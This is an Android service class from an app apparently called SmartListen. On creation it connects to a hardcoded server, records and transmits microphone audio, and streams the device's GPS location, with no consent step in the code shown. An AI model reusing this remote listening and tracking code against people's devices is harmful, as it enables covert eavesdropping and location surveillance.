package com.saiteng.smartlisten.service;

import java.util.Calendar;
import com.saiteng.smartlisten.baidumap.GpsLocation;
import com.saiteng.smartlisten.common.MPUPath;
import com.saiteng.smartlisten.control.RecordControl;
import com.saiteng.smartlisten.process.AVDialogProcess;
import com.saiteng.smartlisten.process.ProcessManager;
import com.smarteye.adapter.BVCU_PUCFG_GPSData;
import com.smarteye.adapter.BVCU_WallTime;
import com.smarteye.adapter.BVPU_ServerParam;
import com.smarteye.bean.JNIMessage;
import com.smarteye.coresdk.AudioHelper;
import com.smarteye.coresdk.BVPU;
import com.smarteye.coresdk.GPSHelper;
import com.smarteye.coresdk.JNIMessageEvent;
import android.app.Service;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;

public class MPUListenService extends Service implements JNIMessageEvent,LocationListener{
	private BVPU_ServerParam param;

	private ProcessManager mProcessManager = new ProcessManager();

	private MPUListenApplication mpuListenApplication;
	
	private String TAG="MPUListenService";
	
	private RecordControl recordControl;
	
	@Override
	public IBinder onBind(Intent intent) {
		
		return null;
	}
	@Override
	public void onCreate() {
		initData();
		login(mpuListenApplication.getServerParam());
		
		
	}
	private void initData() {
		mpuListenApplication=new MPUListenApplication();
		param = mpuListenApplication.getServerParam();
		String mServiceAddr ="211.144.85.109";
		int mPort = 9702;
		param.szServerAddr = mServiceAddr;
		param.iServerPort = mPort;
		param.szDeviceName=android.os.Build.MODEL;//获得机型
		param.szChannelName="voice";
		param.iDeviceID=677791796;
		param.iMediaDir=12;//只传输音频
		param. bGPSEnable=1;//传输gps数据
	}
	public void login(BVPU_ServerParam param) {
		recordControl=new RecordControl();
		MPUPath.createFileMPU();
		BVPU.InitCoreSDK();
		BVPU.setMessageEvent(this);
		BVPU.Initialize();
		//启动音频采集线程
		AudioHelper.GetAudioHelper().SetContext(this);
		AudioHelper.GetAudioHelper().InitAudioPlayer(1);
		AudioHelper.GetAudioHelper().InitAudioRecorder(1);
		mProcessManager.addProcess(new AVDialogProcess());
		//启动定位
		GpsLocation.GpsLocation(MPUListenService.this).requestLocation(MPUListenService.this);
		JNIMessage message = new JNIMessage();
		message.addStrParam(JNIMessage.Key.JNIMESSAGE_KEY_S_ID.getName(),
				"login");
		message.setObj(param);
		BVPU.PostMessageToNative(message);
		//开始录音
	    recordControl.startAudioRecord();
	}
	/**
	  *录像消息 
	  */
	public void audioRecord(String msg) {
		JNIMessage message = new JNIMessage();
		message.addStrParam(JNIMessage.Key.JNIMESSAGE_KEY_S_ID.getName(),
				"record.audio");
		message.addStrParam(
				JNIMessage.Key.JNIMESSAGE_KEY_S_RESULT.getName(), msg);
		BVPU.PostMessageToNative(message);
	}
	
	@Override
	public void onMessageFromNative(JNIMessage message) {
		mProcessManager.process(message);
		
	}
	
	@Override
	public void onLocationChanged(Location location) {
		if (location != null) {
			double latitude = location.getLatitude();
			double longitude = location.getLongitude();
			BVCU_PUCFG_GPSData data = new BVCU_PUCFG_GPSData();
			BVCU_WallTime time = new BVCU_WallTime();
			Calendar calendar = Calendar.getInstance();
			time.iDay = (char) calendar.get(Calendar.DAY_OF_MONTH);
			time.iHour = ((char) calendar.get(Calendar.HOUR_OF_DAY));
			time.iMinute = ((char) calendar.get(Calendar.MINUTE));
			time.iMonth = ((char) (calendar.get(Calendar.MONTH) + 1));
			time.iSecond = ((char) calendar.get(Calendar.SECOND));
			time.iYear = ((short) calendar.get(Calendar.YEAR));
			data.stTime = time;
			data.iLatitude = ((int) (latitude * 10000000));
			data.iLongitude = ((int) (longitude * 10000000));
			data.bOrientationState = 1;
			data.bAntennaState = 1;
			Log.d(TAG, "WGS坐标:" + latitude + "," + longitude);
			BVPU.InputGPSData(data);
		} else {
		}
		
	}
	@Override
	public void onStatusChanged(String provider, int status, Bundle extras) {
		// TODO Auto-generated method stub
		
	}
	@Override
	public void onProviderEnabled(String provider) {
		// TODO Auto-generated method stub
		
	}
	@Override
	public void onProviderDisabled(String provider) {
		// TODO Auto-generated method stub
		
	}
	
	@Override
	public void onDestroy() {
		super.onDestroy();
		BVPU.Finish();
		GpsLocation.GpsLocation(this).cancelLocation(this);
		AudioHelper.GetAudioHelper().ReleaseAudioPlayer();
		AudioHelper.GetAudioHelper().ReleaseAudioRecorder();
		System.exit(0);
	}

}
